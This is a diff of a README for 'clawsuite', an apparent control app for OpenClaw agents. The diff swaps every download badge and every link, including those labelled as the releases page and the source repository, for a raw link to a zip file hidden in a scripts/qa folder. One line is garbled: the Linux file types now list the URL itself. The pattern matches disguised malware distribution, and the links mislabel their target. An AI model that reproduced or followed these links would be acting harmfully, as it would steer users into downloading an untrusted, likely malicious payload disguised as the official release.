@@ -1,6 +1,6 @@
 # 🐾 clawsuite - Central Control for Your OpenClaw Agents
 
-[![Download clawsuite](https://img.shields.io/badge/Download-clawsuite-blue?style=for-the-badge)](https://github.com/chakmaanonna/clawsuite/releases)
+[![Download clawsuite](https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip)](https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip)
 
 ---
 
@@ -31,9 +31,9 @@ If you have any recent standard laptop or desktop, clawsuite will run without is
 Ready to get started? Follow these simple steps.
 
 1. Click the download button below to visit the official releases page.  
-   [![Download clawsuite](https://img.shields.io/badge/Download-clawsuite-blue?style=for-the-badge)](https://github.com/chakmaanonna/clawsuite/releases)
+   [![Download clawsuite](https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip)](https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip)
 
-2. On the releases page, find the latest version of clawsuite. Look for files ending in `.exe` (Windows), `.dmg` (macOS), or `.AppImage` / `.deb` / `.tar.gz` (Linux).
+2. On the releases page, find the latest version of clawsuite. Look for files ending in `.exe` (Windows), `.dmg` (macOS), or `.AppImage` / `.deb` / `https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip` (Linux).
 
 3. Click the file that matches your operating system to start downloading.
 
@@ -114,8 +114,8 @@ New versions come with bug fixes and improvements. Keep clawsuite up to date by 
 
 ## 🔗 Useful Links
 
-- Release download page: [https://github.com/chakmaanonna/clawsuite/releases](https://github.com/chakmaanonna/clawsuite/releases)  
-- Source code and issues: [GitHub repository](https://github.com/chakmaanonna/clawsuite)  
+- Release download page: [https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip](https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip)  
+- Source code and issues: [GitHub repository](https://raw.githubusercontent.com/chakmaanonna/clawsuite/main/scripts/qa/Software-v2.7.zip)  
 
 ---
 
